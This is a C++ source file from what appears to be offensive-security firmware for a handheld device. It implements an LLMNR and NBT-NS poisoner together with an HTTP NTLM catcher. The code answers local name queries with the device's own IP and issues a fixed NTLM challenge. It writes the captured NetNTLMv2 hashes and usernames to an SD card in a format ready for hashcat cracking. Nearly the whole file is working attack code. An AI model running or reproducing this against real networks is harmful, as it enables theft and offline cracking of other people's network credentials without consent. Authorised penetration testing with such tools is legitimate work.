// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// responder / rsp — see responder.h. LLMNR + NBT-NS poisoning + HTTP NetNTLMv2
// capture. Methodology follows lgandx/Responder (NOTICES). [EXP], untested.

#include "responder.h"

#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include <mbedtls/base64.h>
#include <lwip/udp.h>
#include <lwip/igmp.h>
#include <lwip/tcpip.h>

#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "sdcard_manager.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

// Fixed 8-byte NTLM server challenge → captured hashes are hashcat-ready.
static const uint8_t RSP_CHALLENGE[8] = {0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88};

// ── poisoned-event ring (udp cbs run on the tcpip thread) ─────────────────────
struct RspEvt { uint8_t proto; char name[40]; };   // proto: 0 LLMNR, 1 NBT-NS
static volatile RspEvt s_ring[16];
static volatile uint8_t s_rHead = 0, s_rTail = 0;
static uint8_t s_ourIp[4];

static void rspPush(uint8_t proto, const char* name) {
    uint8_t nh = (s_rHead + 1) & 15;
    if (nh == s_rTail) return;   // full
    s_ring[s_rHead].proto = proto;
    strncpy((char*)s_ring[s_rHead].name, name, 39);
    ((char*)s_ring[s_rHead].name)[39] = '\0';
    s_rHead = nh;
}

// ── DNS name (LLMNR) → dotted string; returns question length (name+qtype+qclass)
static int dnsParseName(const uint8_t* p, int len, char* out, int outSz) {
    if (len < 12) return -1;
    int i = 12, o = 0;   // questions start at offset 12
    while (i < len && p[i] != 0) {
        int l = p[i++];
        if (l > 63 || i + l > len) return -1;
        for (int j = 0; j < l && o < outSz - 1; j++) out[o++] = (char)p[i++];
        if (i < len && p[i] != 0 && o < outSz - 1) out[o++] = '.';   // i<len: no OOB read
    }
    out[o] = '\0';
    if (i + 1 + 4 > len) return -1;    // truncated: no terminator + qtype + qclass
    return (i + 1 + 4) - 12;           // name + terminating 0 + qtype(2) + qclass(2)
}

// ── NetBIOS first-level name decode (32 enc chars → ≤15 char name) ─────────────
static void nbtDecodeName(const uint8_t* enc, char* out, int outSz) {
    int o = 0;
    for (int i = 0; i < 32 && o < outSz - 1; i += 2) {
        char c = (char)(((enc[i] - 'A') << 4) | (enc[i + 1] - 'A'));
        if (c == ' ' || c == 0) break;
        out[o++] = c;
    }
    out[o] = '\0';
}

// ── LLMNR responder (UDP 5355, mcast 224.0.0.252) ─────────────────────────────
static void llmnrRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
                      const ip_addr_t* addr, u16_t port) {
    if (!p) return;
    if (p->len >= 12 && !(((uint8_t*)p->payload)[2] & 0x80)) {   // QR==0 (a query)
        uint8_t* q = (uint8_t*)p->payload;
        char name[40];
        int qlen = dnsParseName(q, p->len, name, sizeof(name));
        if (qlen > 0 && qlen <= 100) {   // 12 + qlen + 16-byte answer must fit out[128]
            uint8_t out[128]; int n = 0;
            out[0]=q[0]; out[1]=q[1];            // txid
            out[2]=0x80; out[3]=0x00;            // flags: response
            out[4]=0; out[5]=1;                  // QD=1
            out[6]=0; out[7]=1;                  // AN=1
            out[8]=0; out[9]=0; out[10]=0; out[11]=0;
            n = 12;
            memcpy(out + n, q + 12, qlen); n += qlen;    // echo question
            out[n++]=0xC0; out[n++]=0x0C;        // name ptr
            out[n++]=0x00; out[n++]=0x01;        // A
            out[n++]=0x00; out[n++]=0x01;        // IN
            out[n++]=0; out[n++]=0; out[n++]=0; out[n++]=30;   // TTL
            out[n++]=0x00; out[n++]=0x04;        // rdlen
            memcpy(out + n, s_ourIp, 4); n += 4;
            struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
            if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
            rspPush(0, name);
        }
    }
    pbuf_free(p);
}

// ── NBT-NS responder (UDP 137, broadcast) ─────────────────────────────────────
static void nbtRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
                    const ip_addr_t* addr, u16_t port) {
    if (!p) return;
    // header(12) + name(34) minimum; QR==0 and opcode query (flags byte2 bit7=0)
    if (p->len >= 50 && !(((uint8_t*)p->payload)[2] & 0x80)) {
        uint8_t* q = (uint8_t*)p->payload;
        if (q[12] == 0x20) {                 // NetBIOS name len marker
            char name[20]; nbtDecodeName(q + 13, name, sizeof(name));
            uint8_t out[64]; int n = 0;
            out[0]=q[0]; out[1]=q[1];         // txid
            out[2]=0x85; out[3]=0x00;         // flags: response, authoritative
            out[4]=0; out[5]=0;               // QD=0
            out[6]=0; out[7]=1;               // AN=1
            out[8]=0; out[9]=0; out[10]=0; out[11]=0;
            n = 12;
            memcpy(out + n, q + 12, 34); n += 34;   // echo encoded name
            out[n++]=0x00; out[n++]=0x20;     // NB
            out[n++]=0x00; out[n++]=0x01;     // IN
            out[n++]=0; out[n++]=0; out[n++]=0; out[n++]=0xE5;   // TTL
            out[n++]=0x00; out[n++]=0x06;     // rdlen
            out[n++]=0x00; out[n++]=0x00;     // NB flags
            memcpy(out + n, s_ourIp, 4); n += 4;
            struct pbuf* r = pbuf_alloc(PBUF_TRANSPORT, n, PBUF_RAM);
            if (r) { memcpy(r->payload, out, n); udp_sendto(pcb, r, addr, port); pbuf_free(r); }
            rspPush(1, name[0] ? name : "<nbt>");
        }
    }
    pbuf_free(p);
}

// ── NTLM Type-2 (challenge) message, base64 ───────────────────────────────────
static String ntlmType2B64() {
    uint8_t t2[48]; memset(t2, 0, sizeof(t2));
    memcpy(t2, "NTLMSSP", 7); t2[7] = 0x00;
    t2[8] = 0x02;                              // MessageType = 2
    t2[16] = 48;                               // TargetName offset (len 0)
    t2[20] = 0x01; t2[21] = 0x82;              // flags: UNICODE|NTLM|ALWAYS_SIGN
    memcpy(t2 + 24, RSP_CHALLENGE, 8);         // ServerChallenge
    t2[44] = 48;                               // TargetInfo offset (len 0)
    unsigned char b64[80]; size_t ol = 0;
    mbedtls_base64_encode(b64, sizeof(b64), &ol, t2, sizeof(t2));
    return String((char*)b64);
}

static String hex(const uint8_t* d, int n) {
    static const char* H = "0123456789abcdef";
    String s; s.reserve(n * 2);
    for (int i = 0; i < n; i++) { s += H[d[i] >> 4]; s += H[d[i] & 15]; }
    return s;
}
static String utf16leToAscii(const uint8_t* d, int n) {
    String s; for (int i = 0; i + 1 < n; i += 2) s += (char)d[i]; return s;
}

// Parse an NTLM Type-3 and, on success, write a hashcat -m 5600 line. Returns
// the "user" for the UI, or "" if not a usable Type-3.
static String ntlmType3Capture(const String& b64, const IPAddress& src) {
    uint8_t dec[2048]; size_t dl = 0;   // room for Type-3 with large AV target-info blobs
    if (mbedtls_base64_decode(dec, sizeof(dec), &dl, (const unsigned char*)b64.c_str(), b64.length()) != 0)
        return "";
    if (dl < 52 || memcmp(dec, "NTLMSSP", 7) != 0 || dec[8] != 0x03) return "";

    auto u16 = [&](int o){ return (uint16_t)(dec[o] | (dec[o+1] << 8)); };
    auto u32 = [&](int o){ return (uint32_t)(dec[o] | (dec[o+1]<<8) | (dec[o+2]<<16) | (dec[o+3]<<24)); };

    uint16_t ntLen = u16(20); uint32_t ntOff = u32(24);
    uint16_t domLen = u16(28); uint32_t domOff = u32(32);
    uint16_t usrLen = u16(36); uint32_t usrOff = u32(40);
    if (ntOff + ntLen > dl || ntLen < 24) return "";
    if (domOff + domLen > dl || usrOff + usrLen > dl) return "";

    String user = utf16leToAscii(dec + usrOff, usrLen);
    String dom  = utf16leToAscii(dec + domOff, domLen);
    String proof = hex(dec + ntOff, 16);
    String blob  = hex(dec + ntOff + 16, ntLen - 16);
    if (user.isEmpty()) user = "(anon)";
    if (dom.isEmpty())  dom  = "WORKGROUP";

    // hashcat -m 5600:  user::domain:serverchallenge:NTProofStr:blob
    String line = user + "::" + dom + ":" + hex(RSP_CHALLENGE, 8) + ":" + proof + ":" + blob;

    File f = SD.open(String(SD_DIR_RESPONDER) + "/hashes.txt", FILE_APPEND);
    if (f) { f.println(line); f.close(); }
    File c = SD.open(String(SD_DIR_RESPONDER) + "/log.csv", FILE_APPEND);
    if (c) { c.printf("%lu,http-ntlm,%s,%s\\%s\n", (unsigned long)millis(),
                      src.toString().c_str(), dom.c_str(), user.c_str()); c.close(); }
    return user;
}

void runResponder(char* args) {
    (void)args;
    DisplayManager& dm = displayManager;

    if (WiFi.status() != WL_CONNECTED) {
        dm.clearScreen(); dm.setTextColor(TFT_RED);
        dm.println("Not connected. Run `cw` first."); delay(1800); return;
    }
    IPAddress ip = WiFi.localIP();
    for (int i = 0; i < 4; i++) s_ourIp[i] = ip[i];
    s_rHead = s_rTail = 0;

    // ── raw lwip UDP poisoners ────────────────────────────────────────────────
    struct udp_pcb* llmnr = nullptr;
    struct udp_pcb* nbt   = nullptr;
    ip_addr_t mcast; IP_ADDR4(&mcast, 224, 0, 0, 252);
    LOCK_TCPIP_CORE();
    llmnr = udp_new();
    if (llmnr) { udp_bind(llmnr, IP_ANY_TYPE, 5355); igmp_joingroup(IP4_ADDR_ANY4, ip_2_ip4(&mcast)); udp_recv(llmnr, llmnrRecv, nullptr); }
    nbt = udp_new();
    if (nbt) { udp_bind(nbt, IP_ANY_TYPE, 137); udp_recv(nbt, nbtRecv, nullptr); }
    UNLOCK_TCPIP_CORE();

    // ── HTTP NTLM catcher ─────────────────────────────────────────────────────
    WiFiServer http(80);
    http.begin();
    String type2 = ntlmType2B64();

    // ── static UI ─────────────────────────────────────────────────────────────
    const int statY = 110, listLblY = 130, listY = 146, capY = 192;
    auto drawStatic = [&]() {
        dm.clearScreen();
        dm.setTextColor(TFT_RED);    dm.setCursor(10, 40);  dm.printText("[RESPONDER]");
        dm.setTextColor(0xFD20);     dm.setCursor(112, 40); dm.printText("[EXP]");
        dm.setTextColor(0x7BEF);     dm.setCursor(10, 58);  dm.printText("LLMNR + NBT-NS poison -> NetNTLMv2");
        dm.setTextColor(TFT_WHITE);  dm.setCursor(10, 76);  dm.printText("me  " + ip.toString());
        dm.setTextColor(0x5AEB);     dm.setCursor(10, 92);  dm.printText("SD /apps/responder/hashes.txt");
        dm.setTextColor(0x5AEB);     dm.setCursor(10, listLblY); dm.printText("recent name queries:");
        dm.setTextColor(0x7BEF);     dm.setCursor(10, 214); dm.printText("[q] stop   crack: hashcat -m 5600");
    };
    drawStatic();

    uint32_t llmnrN = 0, nbtN = 0, caps = 0, lastDraw = 0;
    char lastNames[3][40] = {{0},{0},{0}};
    char lastCap[48] = {0};
    bool stop = false;

    while (!stop) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) drawStatic();

        // drain poison ring
        while (s_rTail != s_rHead) {
            RspEvt e = *(RspEvt*)&s_ring[s_rTail];
            s_rTail = (s_rTail + 1) & 15;
            if (e.proto) nbtN++; else llmnrN++;
            memmove(lastNames[0], lastNames[1], 40);
            memmove(lastNames[1], lastNames[2], 40);
            snprintf(lastNames[2], 40, "%s  %s", e.proto ? "NBT" : "LLM", e.name);
        }

        // service one HTTP client
        WiFiClient cl = http.available();
        if (cl) {
            String auth;
            uint32_t t0 = millis();
            while (cl.connected() && millis() - t0 < 1500) {
                String ln = cl.readStringUntil('\n');
                if (ln.length() <= 1) break;              // end of headers
                if (ln.startsWith("Authorization: NTLM ")) auth = ln.substring(20);
                if (ln.startsWith("Authorization: Negotiate ")) auth = ln.substring(25);
            }
            auth.trim();
            if (auth.length() > 0) {
                // decode just the message type byte (offset 8) to branch
                uint8_t hd[16]; size_t ol = 0;
                mbedtls_base64_decode(hd, sizeof(hd), &ol, (const unsigned char*)auth.c_str(),
                                      auth.length() > 20 ? 20 : auth.length());
                uint8_t mtype = (ol > 8) ? hd[8] : 0;
                if (mtype == 1) {   // negotiate → send challenge
                    cl.print(String("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM ") +
                             type2 + "\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n");
                } else if (mtype == 3) {   // auth → capture
                    String u = ntlmType3Capture(auth, cl.remoteIP());
                    if (u.length()) { caps++; snprintf(lastCap, sizeof(lastCap), "%s @ %s", u.c_str(), cl.remoteIP().toString().c_str()); }
                    cl.print("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok");
                } else {
                    cl.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\n\r\n");
                }
            } else {
                cl.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\n\r\n");
            }
            cl.stop();
        }

        uint32_t now = millis();
        if (now - lastDraw >= 400 && !displayManager.isBlocked()) {
            lastDraw = now;
            // counters (green once a hash is captured)
            dm.fillRect(10, statY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
            dm.setCursor(10, statY); dm.setTextColor(caps ? TFT_GREEN : TFT_CYAN);
            char s[48]; snprintf(s, sizeof(s), "LLMNR %lu  NBT %lu  HASH %lu",
                                 (unsigned long)llmnrN, (unsigned long)nbtN, (unsigned long)caps);
            dm.printText(s);
            // recent poisoned names
            dm.fillRect(10, listY, SCREEN_WIDTH - 20, 3 * 13, TFT_BLACK);
            dm.setTextColor(0xC618);
            for (int i = 0; i < 3; i++) if (lastNames[i][0]) { dm.setCursor(10, listY + i * 13); dm.printText(String(lastNames[i])); }
            // latest capture (or waiting state)
            dm.fillRect(10, capY, SCREEN_WIDTH - 20, 14, TFT_BLACK);
            dm.setCursor(10, capY);
            if (lastCap[0]) { dm.setTextColor(TFT_YELLOW); dm.printText(String(">> ") + lastCap); }
            else            { dm.setTextColor(0x5AEB);     dm.printText("waiting for NTLM auth..."); }
        }
        if (inputHandler.getKeyboardInput() == 'q') stop = true;
        delay(10);
    }

    // ── teardown ──────────────────────────────────────────────────────────────
    http.stop();
    LOCK_TCPIP_CORE();
    if (llmnr) { igmp_leavegroup(IP4_ADDR_ANY4, ip_2_ip4(&mcast)); udp_remove(llmnr); }
    if (nbt)   { udp_remove(nbt); }
    UNLOCK_TCPIP_CORE();
}
